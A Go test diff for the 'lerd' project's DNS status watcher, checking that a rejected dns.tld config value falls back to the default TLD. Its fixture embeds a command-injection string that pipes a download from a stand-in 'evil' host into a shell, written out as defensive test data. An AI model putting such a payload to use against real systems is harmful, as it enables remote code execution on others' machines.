@@ -1,6 +1,8 @@
 package ui
 
 import (
+	"os"
+	"path/filepath"
 	"testing"
 
 	"github.com/gabriel-sousa99/lerd/internal/dns"
@@ -218,5 +220,26 @@ func TestTickDNSStatusTLDFromConfig(t *testing.T) {
 	tickDNSStatus(deps)
 	if seen != "lerd" {
 		t.Fatalf("check called with tld=%q, want %q", seen, "lerd")
+	}
+}
+
+// The watcher must probe the suffix the dnsmasq config was written from, not the
+// raw config value. A dns.tld the writer refused leaves the dashboard reporting
+// DNS down forever while the CLI reports it working (#1559).
+func TestDefaultDNSStatusDeps_ProbesTheServedTLD(t *testing.T) {
+	cfgHome := t.TempDir()
+	t.Setenv("XDG_CONFIG_HOME", cfgHome)
+	t.Setenv("XDG_DATA_HOME", t.TempDir())
+	dir := filepath.Join(cfgHome, "lerd")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	body := "dns:\n  enabled: true\n  tld: \"bad'; curl http://evil/x | sh; #\"\n"
+	if err := os.WriteFile(filepath.Join(dir, "config.yaml"), []byte(body), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if got := defaultDNSStatusDeps().tld(); got != dns.DefaultTLD {
+		t.Errorf("watcher probes %q, but the writer serves %q", got, dns.DefaultTLD)
 	}
 }
